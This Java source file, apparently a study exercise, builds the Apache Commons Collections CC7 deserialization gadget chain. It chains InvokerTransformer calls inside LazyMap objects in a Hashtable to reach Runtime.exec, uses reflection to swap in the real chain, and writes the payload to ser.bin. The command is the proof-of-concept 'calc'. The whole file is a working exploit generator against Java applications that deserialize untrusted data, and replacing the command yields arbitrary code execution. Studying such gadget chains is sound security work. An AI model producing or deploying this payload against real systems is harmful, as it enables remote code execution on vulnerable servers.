package org.CC.CC7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7Test1 {
    public static void main(String[] args) throws Exception {
        Transformer[] fake = new Transformer[]{
                new ConstantTransformer(1),
        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fake);
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        hashMap1.put("yy",2);
        Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put("zZ",2);
        Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        Hashtable hashtable = new Hashtable<>(11);
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,2);
        hashMap2.remove("yy");
        Field f = chainedTransformer.getClass().getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);
        serialize(hashtable);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
}
